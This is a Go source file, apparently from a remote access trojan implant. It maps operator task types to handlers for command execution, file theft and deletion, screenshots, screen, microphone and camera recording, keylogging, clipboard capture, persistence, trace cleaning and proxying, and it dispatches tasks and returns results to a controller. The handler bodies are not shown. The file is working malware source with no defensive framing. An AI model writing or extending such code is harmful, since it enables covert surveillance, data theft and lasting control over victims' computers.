package main

// 任务处理器注册表，与 agent.py TASK_HANDLERS 对齐（23 种任务类型）
var taskHandlers = map[string]func(map[string]interface{}) string{
	"cmd":             taskExecCmd,
	"sysinfo":         taskSysinfo,
	"process_list":    taskProcessList,
	"file_list":       taskFileList,
	"file_download":   taskFileDownload,
	"file_view":       taskFileView,
	"file_save":       taskFileSave,
	"file_mkdir":      taskFileMkdir,
	"file_delete":     taskFileDelete,
	"file_rename":     taskFileRename,
	"file_upload":     taskFileUpload,
	"screenshot":      taskScreenshot,
	"record_screen":   taskRecordScreen,
	"record_audio":    taskRecordAudio,
	"camera_photo":    taskCameraPhoto,
	"camera_record":   taskCameraRecord,
	"keylogger_start": taskKeyloggerStart,
	"clipboard":       taskClipboard,
	"persistence":     taskPersistence,
	"clean_trace":     taskCleanTrace,
	"port_forward":    taskPortForward,
	"socks5_proxy":    taskSocks5Proxy,
	"http_proxy":      taskHttpProxy,
}

// processTask 执行单个任务并回传结果，与 agent.py process_task 对齐
// 任务字段: id / task_type / task_data
func processTask(task map[string]interface{}) {
	taskID := task["id"]
	taskType, _ := task["task_type"].(string)
	var taskData map[string]interface{}
	if d, ok := task["task_data"].(map[string]interface{}); ok {
		taskData = d
	}
	handler, ok := taskHandlers[taskType]
	if !ok {
		submitResult(taskID, "[ERROR] Unknown task type: "+taskType, "failed")
		return
	}
	// 捕获 panic，避免 goroutine 崩溃
	var result string
	var status string = "completed"
	func() {
		defer func() {
			if r := recover(); r != nil {
				result = "[ERROR] " + toString(r)
				status = "failed"
			}
		}()
		result = handler(taskData)
	}()
	submitResult(taskID, result, status)
}
